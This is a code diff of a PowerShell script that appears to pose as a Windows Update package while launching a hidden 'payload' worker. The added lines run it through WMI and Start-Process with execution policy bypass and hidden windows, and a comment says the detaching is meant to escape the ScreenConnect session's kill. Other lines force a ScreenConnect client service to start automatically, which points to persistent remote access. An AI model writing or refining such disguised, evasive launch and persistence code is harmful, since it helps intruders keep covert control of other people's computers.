@@ -8,7 +8,7 @@ $Out = Join-Path $WorkDir 'boot.out'
 $B64 = Join-Path $WorkDir 'update.b64'
 $Pkg = 'C:\Windows\Temp\wucache_pkg.ps1'
 $Run = Join-Path $WorkDir 'run.ps1'
-$Marker = 'WU_BUILD_20260731_UNIFIED8'
+$Marker = 'WU_BUILD_20260731_UNIFIED9'
 $Alt = 'ScreenConnect Client (f861c8140d453427)'
 $Cb = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
 
@@ -102,19 +102,25 @@ try { sc.exe config '$Alt' start= auto | Out-Null; sc.exe start '$Alt' | Out-Nul
 Set-Content -LiteralPath $Run -Value $runBody -Encoding ASCII -Force
 W 'running_via_runps'
 
-# Detach so ScreenConnect Guest 10s kill cannot stop payload
-$launch = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$Run`" > `"$Out`" 2>&1"
+# Detach: Win32_Process.Create does NOT honor ">" — must use cmd /c
+$cmdLine = "cmd.exe /c powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$Run`" > `"$Out`" 2>&1"
 try {
-    $r = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $launch
+    $r = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $cmdLine
     W ("wmic_pid={0} ret={1}" -f $r.ProcessId, $r.ReturnValue)
 } catch {
+    W ("wmic_fail {0}" -f $_.Exception.Message)
+}
+# Also Start-Process (Admin session) — belt and suspenders
+try {
     Start-Process -FilePath 'powershell.exe' -ArgumentList @(
         '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-File', $Run
-    ) -WindowStyle Hidden -RedirectStandardOutput $Out -RedirectStandardError $Out | Out-Null
+    ) -WindowStyle Hidden | Out-Null
     W 'started_startprocess'
+} catch {
+    W ("startprocess_fail {0}" -f $_.Exception.Message)
 }
 
-Write-Host "Launched UNIFIED8 worker. Check in 2 min:"
+Write-Host "Launched UNIFIED9 worker. Check in 2 min:"
 Write-Host "  type $Err"
 Write-Host "  type $WorkDir\.diag.log"
 try { sc.exe start $Alt | Out-Null } catch {}
